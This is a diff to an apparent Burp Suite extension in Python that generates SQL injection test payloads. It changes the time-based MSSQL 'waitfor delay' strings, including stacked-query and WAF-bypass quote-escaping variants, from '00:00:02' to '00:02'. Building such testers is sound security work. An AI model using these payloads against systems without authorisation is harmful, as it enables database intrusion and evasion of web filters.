@@ -476,11 +476,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                         listSQLi.append(prefix + unionPhrase + "\n")
                                     if self._cbTimeBased.isSelected():
                                         if escapeChar:
-                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
+                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
                                         else:
-                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:00:02'" + "\n")
+                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:02'" + "\n")
                                             if self._cbSqlWafBypass.isSelected():
-                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:00:02\\'" + "\n")
+                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:02\\'" + "\n")
                                 if self._cbOracleBased.isSelected():
                                     listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                     if not escapeChar:
@@ -603,18 +603,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                         if self._cbTimeBased.isSelected():
                             if escapeChar:
-                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
-                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:00:02" + escapeChar + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
+                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
                             else:
-                                listSQLi.append(prefix + " waitfor delay '00:00:02'" + suffix + "\n")
-                                listSQLi.append(prefix + " waitfor delay '00:00:02'" + "\n")
-                                listSQLi.append(prefix + ";waitfor delay '00:00:02'" + suffix + "\n")
-                                listSQLi.append(prefix + ";waitfor delay '00:00:02'" + "\n")
+                                listSQLi.append(prefix + " waitfor delay '00:02'" + suffix + "\n")
+                                listSQLi.append(prefix + " waitfor delay '00:02'" + "\n")
+                                listSQLi.append(prefix + ";waitfor delay '00:02'" + suffix + "\n")
+                                listSQLi.append(prefix + ";waitfor delay '00:02'" + "\n")
                                 if self._cbSqlWafBypass.isSelected():
-                                    listSQLi.append(prefix + " waitfor delay \\'00:00:02\\'" + suffix + "\n")
-                                    listSQLi.append(prefix + " waitfor delay \\'00:00:02\\'" + "\n")
-                                    listSQLi.append(prefix + ";waitfor delay \\'00:00:02\\'" + suffix + "\n")
-                                    listSQLi.append(prefix + ";waitfor delay \\'00:00:02\\'" + "\n")
+                                    listSQLi.append(prefix + " waitfor delay \\'00:02\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + " waitfor delay \\'00:02\\'" + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\'00:02\\'" + suffix + "\n")
+                                    listSQLi.append(prefix + ";waitfor delay \\'00:02\\'" + "\n")
         listSQLi = list(set(listSQLi))
         listSQLi.sort()
         if self._cbSqlEncoding.isSelected():
